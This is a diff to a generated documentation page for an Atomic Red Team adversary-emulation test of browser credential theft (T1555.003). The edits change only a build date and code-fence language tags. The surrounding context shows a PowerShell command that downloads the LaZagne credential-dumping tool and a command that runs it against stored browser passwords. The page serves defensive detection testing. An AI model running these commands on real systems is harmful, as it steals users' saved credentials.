@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1555.003"
 attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "9a2915b3-3954-4cce-8c76-00fbf4dbd014"
@@ -53,13 +53,13 @@ LaZagne.exe must exist on disk at specified location (#{lazagne_path})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{lazagne_path}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{lazagne_path}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}"
 ```
@@ -71,7 +71,7 @@ Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4
 
 ### Command
 
-```commandprompt
+```cmd
 "#{lazagne_path}" browsers
 ```
 
